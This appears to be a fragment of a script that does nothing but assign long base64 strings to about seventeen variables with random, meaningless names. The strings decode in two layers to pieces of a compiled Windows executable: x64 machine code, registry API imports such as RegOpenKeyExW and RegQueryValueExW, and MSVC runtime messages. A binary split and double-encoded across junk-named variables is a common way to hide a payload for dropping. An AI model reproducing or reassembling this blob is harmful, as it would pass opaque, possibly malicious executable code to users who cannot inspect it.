 AgueKiModrZKnzNcDlSlciLGxibrcCzQwfyoKRKeKsrjDfBcZejuWjlgDcWTgkzJa = "aGNCMGRVRzRCQUVBQUVpTmxDUXdBZ0FBU0l2STZDekkvLytGd0hSYlFiZ0VBUUFBU0kxVUpDQklqWXdrTUFJQUFPaWlCQUFBaGNCMFB6UFNTSTFNSkNCQnVBQUpBQURvZHNULy8waUZ3QStGcHdBQUFQOFYxY1FBQUlQNFYzVVpNOUpFalVDeFNJMU1KQ0RvVXNULy8waUZ3QStGZ3dBQUFEUFNTSTBOWG1zQUFFRzRBQW9BQU9nMXhQLy9TSVhBZFdyL0ZaakVBQUNEK0ZkMVhVRzRCQUVBQUVpTmxDUXdBZ0FBTThub2xNZi8vNFhBZEVSQnVBUUJBQUJJalZRa0lFaU5qQ1F3QWdBQTZBb0VBQUNGd0hRb005SklqVXdrSUVTTlFnam80TVAvLzBpTGpDUkFCQUFBU0RQTTZHL0YvLzlJZ2NSWUJBQUF3elBBU0l1TUpFQUVBQUJJTTh6b1ZjWC8vMGlCeEZnRUFBRER6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16RWlKWENRSVNJbDBKQkJJaVh3a0dFeUpkQ1FnVlVpTnJDU1Evdi8vU0lIc2NBSUFBRWlMQlIyREFBQklNOFJJaVlWZ0FRQUFNOUpJalEyaWFBQUFRYmdBQ0FBQTZBSEQvLzlJaS9oSWhjQjFSRFBTU0kwTjNtZ0FBRUc0QUFnQUFPamx3di8vU0l2NFNJWEFkU2ovRlVYREFBQ0QrRmNQaFpnQUFBQkZNOEJJalEy"
 CMcHjPZdSArLleKhnlmUMet = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 tmhPQej = "SkNHRFBXUzBBQUFCZFF5NUJ3QUFBT2czNy8vLzYxaURQVSswQUFBQWRVckhCVU8wQUFBQkFBQUFTSTBWZElJQUFFaU5EVDEvQUFEb25lMy8vNFhBZEFxNC93QUFBT2tqQVFBQVNJMFZFMzRBQUVpTkRleDdBQURvK083Ly84Y0ZCYlFBQUFJQUFBRHJCY1pFSkNBQkQ3Wk1KQ0hvdis3Ly8raFc3di8vU0lsRUpEQklpMFFrTUVpRE9BQjBQVWlMVENRdzZQTHMvLzhQdHNDRndIUXNTSXRFSkRCSWl3QklpVVFrU0VpTFJDUklTSWxFSkZCRk04QzZBZ0FBQURQSlNJdEVKRkQvRlpvTEFRRG9OdTcvLzBpSlJDUTRTSXRFSkRoSWd6Z0FkQjVJaTB3a09PaWc3UC8vRDdiQWhjQjBEVWlMUkNRNFNJc0k2SS91Ly8vb0lnRUFBSWxFSkNqb3F1My8vdysyd0lYQWRRbUxUQ1FvNkg3ci8vOFB0a1FrSUlYQWRRWG9iZTcvL3pQU3NRSG9TT3ovLzR0RUpDanJOWWxFSkNTTFJDUWtpVVFrTE9oczdmLy9EN2JBaGNCMUNZdE1KQ3pvNU96Ly93KzJSQ1FnaGNCMUJlaFo3UC8vaTBRa0xPc0FTSVBFYU1QTXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXhJZyt3bzZEZnMvLytMeU9qVTdmLy9TSVBFS01Q"
 HMoOPkeugJdMLpGdjluwNnPIJwghxQyhDoAnlaBJgjLxBMyaowUuCgCLsTuoPjRcJkk = "QkRBRUFERUlBQUFFS0F3QUt3Z1p3QldBQUFBQUFBQUFCRndFQUYySUFBQUVFQVFBRVFnQUFBUVFCQUFSQ0FBQUJCQUVBQkVJQUFBRUVBUUFFUWdBQUFRUUJBQVJDQUFBQkJBRUFCRUlBQUFFSkFRQUpRZ0FBQVE0QkFBNWlBQUFCQkFFQUJHSUFBQUVHQWdBR2NnSndBUVFCQUFSQ0FBQUJCQUVBQkVJQUFBRUVBUUFFWWdBQUFRUUJBQVFpQUFBQkNRTUFDUUVVQUFKd0FBQUFBQUFBQVFRQkFBUmlBQUFCQkFFQUJFSUFBQUVFQVFBRVFnQUFBUXdEQUF3QnZnQUZjQUFBQUFBQUFBRUpBUUFKWWdBQUFRb0VBQW8wQmdBS01nWndBQUFBQUFFS0JBQUtOQVlBQ2pJR2NBQUFBQUFCQ1FFQUNTSUFBQUVKQVFBSlFnQUFBUVFCQUFSaUFBQUJDUUVBQ1VJQUFBRUpBUUFKUWdBQUFRa0JBQWxDQUFBQkNRRUFDVUlBQUFFSkFRQUpRZ0FBQVJNQkFCTkNBQUFCRXdFQUUwSUFBQUVUQVFBVFFnQUFBUk1CQUJOQ0FBQUJHd2tBR3dFV0FBL2dEZEFMd0Fsd0NHQUhNQVpRQUFBQUFBQUFHVFVMQUNUa1V3QWtkRklBSkdSUkFDUTBVQUFrQVU0QUZWQUFBRThSQVFCZ0FnQUFBQUFBQUJrZkJRQU5OTk1BRFFIT0FBWndBQUJQRVFFQVlBWUFBQUFBQUFBWkdRSUFCd0dMQUU4UkFRQkFCQUFBQUFBQUFCa1ZBZ0FHa2dJd1R4RUJBRUFBQUFBQUFBQUFBUVFCQUFRaUFBQUJBQUFBQUFBQUFBRUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 wSmoLUZYFsZlCEgyqFEUQperFTvljoBPZzetdZXCawKnEaJnXzmqo = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 JuXQYROQBBeUStRcoCeCphWvZNIpiJ = "WFJmYVc1cGRHbGhiRjl1WVhKeWIzZGZaVzUyYVhKdmJtMWxiblFBZEFGZmFXNXBkSFJsY20wQWRRRmZhVzVwZEhSbGNtMWZaUUJRQkdWNGFYUUFBT29BWDJWNGFYUUF5d0pmYzJWMFgyWnRiMlJsQUFCSkFGOWZjRjlmWDJGeVoyTUFBRW9BWDE5d1gxOWZZWEpuZGdBQXBBQmZZMlY0YVhRQUFKOEFYMk5mWlhocGRBQzJBbDl5WldkcGMzUmxjbDkwYUhKbFlXUmZiRzlqWVd4ZlpYaGxYMkYwWlhocGRGOWpZV3hzWW1GamF3QUF0UUJmWTI5dVptbG5kR2h5WldGa2JHOWpZV3hsQU00Q1gzTmxkRjl1WlhkZmJXOWtaUUJOQUY5ZmNGOWZZMjl0Ylc5a1pRQUFMQVZ6ZEhKamNIbGZjd0FBS0FWemRISmpZWFJmY3dBQWFBQmZYM04wWkdsdlgyTnZiVzF2Ymw5MmMzQnlhVzUwWmw5ekFNSUNYM05sYUY5bWFXeDBaWEpmWkd4c0FISUJYMmx1YVhScFlXeHBlbVZmYjI1bGVHbDBYM1JoWW14bEFBQzFBbDl5WldkcGMzUmxjbDl2Ym1WNGFYUmZablZ1WTNScGIyNEE1UUJmWlhobFkzVjBaVjl2Ym1WNGFYUmZkR0ZpYkdVQXdnQmZZM0owWDJGMFpYaHBkQURCQUY5amNuUmZZWFJmY1hWcFkydGZaWGhwZEFBQVN3VjBaWEp0YVc1aGRHVUFuQU5mZDIxaGEyVndZWFJvWDNNQUFMZ0RYM2R6Y0d4cGRIQmhkR2hmY3dCa0JYZGpjMk53ZVY5ekFBQjFZM0owWW1GelpXUXVaR3hzQUM4Q1IyVjBRM1Z5Y21WdWRGUm9jbVZo"
 iXJYTzXYeRAxxAdcdWEMcLSgPDiYSsfZ = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 KmMyLqjCSWrwNkvMlzkbnHsgwwqlHKsuoDdMRWhvofvhmkeBSrORbXcwXqgjIYnoYoIGIb = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 fNRbSvFMgVUyiPQKVtUtSCvCrotHNgIDP = "UUlTSVBzS0VpTFRDUXc2QWJKLy85SWc4UW93OHpNek16TXpNek1TSWxNSkFoSWcrd29TSXRNSkREb3pRQUFBSVhBZEFITVNJUEVLTVBNek16TXpNek16TXpNek16TXpNek16TXpNU0lsTUpBaElnK3dvU0l0TUpERG9uUUFBQUlYQWRBZTVRUUFBQU0wcFNJUEVLTVBNek16TXpNek16TXpNek16TVNJbE1KQWpEek16TXpNek16TXpNekVpSlRDUUlTSVBzS0VpTFRDUXc2RjBBQUFDRndIUUtTSXRNSkREb0R3QUFBRWlEeENqRHpNek16TXpNek16TXpFaUpUQ1FJU0lQc0tFaUxCVERvQUFCSWhjQjBEa2lMQlNUb0FBQklpMHdrTVAvUVNJUEVLTVBNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNeElpVXdrQ0VpRDdDaElqUVVnY2dBQVNBV0FBQUFBU0lsRUpBaElqUVVPZEFBQVNJbEVKQkJJaTBRa0NFaUxUQ1FRU0N2SVNJdkJTSWxFSkJoSWkwUWtDRWlMVENRd1NDdklTSXZCU0R0RUpCaDNDY2NFSkFFQUFBRHJCOGNFSkFBQUFBQ0xCQ1JJZzhRb3c4ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNeE1pVVFrR0VpSlZDUVFTSWxNSkFoSWcrd29USXRFSkVCSWkxUWtPRWlMVENRdzZBa0JBQUNGd0hRUFNJdE1KRERvTy8vLy80WEFkQUhNU0lQRUtNUE16TXpNek16TXpNek16TXpNek16TXpFeUpSQ1FZU0lsVUpCQklpVXdrQ0VpRDdDaE1pMFFrUUVpTFZDUTRT"
 BsDNqzhXCtPbEzVKpyDrbfU = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 wYrrjLfnbUwYi = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUpSTUJRQUVBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 WzzRmZEXyBwTMR = "QUpRQUFBQUFBQUFBU0lGTlNJekhRRWZBQlp3RlZBQUFBQUFBQUFaVEFVbElpTWRBU2tBRm5BVlVBQUFUeEVCQURnQkFBQUFBQUFBQVM4RkpSY2pFZ0Y1QUF0d0NsQUFBQUFBQUFBQkR3WUFEMVFJQUE4MEJ3QVBNZ3RnQUFBQUFDRUZBZ0FGZEFZQWtCMEJBS3NkQVFCWXhnRUFBQUFBQUNFQUFBQ1FIUUVBcXgwQkFGakdBUUFBQUFBQUFRY0RBQWRDQTNBQ01BQUFBQUFBQUNFTUJBQU05QVFBQlZRSUFFQWVBUUJISGdFQW1NWUJBQUFBQUFBaEJRSUFCV1FKQUVjZUFRQmhIZ0VBcU1ZQkFBQUFBQUFoQlFJQUJlUUtBR0VlQVFCc0hnRUF4TVlCQUFBQUFBQWhBQUFBWVI0QkFHd2VBUURFeGdFQUFBQUFBQ0VBQUFCSEhnRUFZUjRCQUtqR0FRQUFBQUFBSVFBQUFFQWVBUUJISGdFQW1NWUJBQUFBQUFBQkJBRUFCQUlBQUNFRUFnQUVkQUFBUUIwQkFGWWRBUUF3eHdFQUFBQUFBQ0VBQUFCQUhRRUFWaDBCQURESEFRQUFBQUFBQVFRQkFBUmlBQUFCQkFFQUJHSUFBQUVKQVFBSllnQUFBUk1CQUJPaUFBQUJHQUVBR0VJQUFBQUFBQUFCQUFBQUFRUUJBQVJDQUFBQkJBRUFCRUlBQUFFRUFRQUVRZ0FBQVFRQkFBUkNBQUFCQkFFQUJHSUFBQUVFQVFBRWdnQUFBUVFCQUFSQ0FBQUJCQUVBQkVJQUFBRUVBUUFFUWdBQUNRUUJBQVRDQUFBeUVBRUFBUUFBQUxRakFRRDBKQUVBMElBQkFQUWtBUUFBQUFBQUFRWUNBQVl5"
 UKykwpHdNNGkXiqaxyiBGUNAaUweTdOoBKGRmqRRIiPYTSSdiJISJkCfZAtDnbQmbxxLv = "d0lBQUFBQUFMQVhBZ0FBQUFBQWVoMENBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJzR2dJQUFBQUFBTFlhQWdBQUFBQUEwaG9DQUFBQUFBRHFHZ0lBQUFBQUFQZ2FBZ0FBQUFBQURoc0NBQUFBQUFBYUd3SUFBQUFBQUNvYkFnQUFBQUFBT2hzQ0FBQUFBQUNJR2dJQUFBQUFBR0FhQWdBQUFBQUFWQm9DQUFBQUFBQkVHZ0lBQUFBQUFEUWFBZ0FBQUFBQUhob0NBQUFBQUFEd0dRSUFBQUFBQU9ZWkFnQUFBQUFBM0JrQ0FBQUFBQURPR1FJQUFBQUFBTUFaQWdBQUFBQUFzaGtDQUFBQUFBQ3FHUUlBQUFBQUFLSVpBZ0FBQUFBQWxCa0NBQUFBQUFDSUdRSUFBQUFBQUdZWkFnQUFBQUFBUkJrQ0FBQUFBQUFxR1FJQUFBQUFBQllaQWdBQUFBQUFCaGtDQUFBQUFBRDBHQUlBQUFBQUFPSVlBZ0FBQUFBQTBoZ0NBQUFBQUFESUdBSUFBQUFBQUs0WUFnQUFBQUFBbkJnQ0FBQUFBQUNhR2dJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 mjhLporjewBwRYCGtfVqGnokgrsjpeMt = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 emqkzLZGDkbnWPfWmoTmYGLMiZaEqwpWTekMIGY = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUROWFNEU1p0VC8vektpM3kyWkt3QUFBQUFBQUFBQUFBQUJBQUFBQVFBQUFBRUFBQUFCQUFBQUFRQUFBQUFBQUFELy8vLy9BUUFBQUFFQUFBQUNBQUFBQUFBSUFBQUFBQUFBQUFBQ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 LJhyrLoIncLkdHEcvUAqOHrqWcaMMbrRwOoXsjwuIRmckImjwlqUKadNKtyoWTLMabOqb = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek1TSWxjSkFoSWlXd2tFRWlKZENRWVYwaUQ3REJKaTlsSmkvaElpL0pJaStub00rRC8vMHlMVkNSZ1RJdlBUSWxVSkNoTWk4WklpOVZJaVZ3a0lFaUxDT2drNC8vL1NJdGNKRUNGd0VpTGJDUkl1Zi8vLy85SWkzUWtVQTlJd1VpRHhEQmZ3OHpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXhNaVVRa0dFeUpUQ1FnU0lQc09FaU5SQ1JZUlRQSlNJbEVKQ0RvMCtMLy8waUR4RGpEek16TXpNek16TXpNek14SWl3WDVvQUFBdzh6TXpNek16TXpNU0lzRjhhQUFBTVBNek16TXpNek16SVA1QkhjUFNHUEJTSTBOYVlNQUFFaUxCTUhETThERHpNek16TXpNek16TXVBVUFBQUREek16TXpNek16TXpNekVpTEJhbWdBQUJJaVEyaW9BQUFTTWNGbjZBQUFBQUFBQUREek16TXpNek1TSXNGa2FBQUFFaUpEWXFnQUFCSXh3VjNvQUFBQUFBQUFNUE16TXpNek15RCtRUjNGVWhqd1V5TkJmbWVBQUJCaXd5QVFZa1VnSXZCdzdqLy8vLy93OHpNek16TXpNek16TXpNek16TXpNeElpVXdrQ0VpRDdDZ3p5ZjhWZDk4QUFFaUxUQ1F3L3hYazNnQUEveFZlM3dBQXVna0VBTUJJaThqL0ZVamZBQUJJZzhRb3c4ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpFaUpU"
 xeXzhlxSWXXvlttZcMXmr = "QUFBQUFBQUFBQUFGTjBZV05ySUhCdmFXNTBaWElnWTI5eWNuVndkR2x2YmdBQUFBQUFBQUFBUTJGemRDQjBieUJ6YldGc2JHVnlJSFI1Y0dVZ1kyRjFjMmx1WnlCc2IzTnpJRzltSUdSaGRHRUFBQUFBQUFBQUFBQUFBQUFBQUFCVGRHRmpheUJ0WlcxdmNua2dZMjl5Y25Wd2RHbHZiZ0FBQUFBQUFBQUFBRXh2WTJGc0lIWmhjbWxoWW14bElIVnpaV1FnWW1WbWIzSmxJR2x1YVhScFlXeHBlbUYwYVc5dUFBQUFBQUFBQUFBQUFBQUFBQUFBVTNSaFkyc2dZWEp2ZFc1a0lGOWhiR3h2WTJFZ1kyOXljblZ3ZEdWa0FBQUFBQUFBQUFBQUFLRFJBVUFCQUFBQVFOSUJRQUVBQUFBQUFBQUFBQUFBQUdJQWFRQnVBRndBWVFCdEFHUUFOZ0EwQUZ3QVRRQlRBRkFBUkFCQ0FERUFOQUF3QUM0QVJBQk1BRXdBQUFBQUFGWUFRd0JTQUZVQVRnQlVBRWtBVFFCRkFERUFOQUF3QUVRQUxnQmtBR3dBYkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFZUUJ3QUdrQUxRQnRBSE1BTFFCM0FHa0FiZ0F0QUdNQWJ3QnlBR1VBTFFCeUFHVUFad0JwQUhNQWRBQnlBSGtBTFFCc0FERUFMUUF4QUMwQU1BQXVBR1FBYkFCc0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFHRUFaQUIyQUdFQWNBQnBBRE1BTWdBdUFHUUFiQUJzQUFBQUFBQUFBQUFBVW1WblQzQmxia3RsZVVWNFZ3QUFBRkpsWjFGMVpYSjVWbUZzZFdWRmVGY0FB"
